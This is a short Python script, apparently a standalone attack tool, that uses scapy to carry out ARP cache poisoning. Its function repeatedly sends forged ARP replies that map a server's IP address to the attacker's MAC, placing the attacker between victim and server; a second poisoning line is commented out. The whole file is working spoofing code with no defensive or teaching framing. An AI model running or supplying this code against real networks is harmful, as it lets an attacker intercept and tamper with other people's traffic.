from scapy.all import *
import time

def arp_poison(ipVictim, macVictim, ipServer, macServer, ipAttacker, macAttacker, interface):

    arp_response_victim = ARP(op=2, pdst=ipVictim, hwdst=macVictim, psrc=ipServer, hwsrc=macAttacker)
    #arp_response_server = ARP(op=2, pdst=ipVictim, hwdst=macVictim, psrc=ipServer, hwsrc=macAttacker)

    while True:
        try:
            sendp(Ether(src=macAttacker, dst="ff:ff:ff:ff:ff:ff")/arp_response_victim, iface=interface, verbose=False)
            #sendp(Ether(src=macAttacker, dst="ff:ff:ff:ff:ff:ff")/arp_response_server, iface=interface, verbose=False)
            time.sleep(5)
        except KeyboardInterrupt:
            break

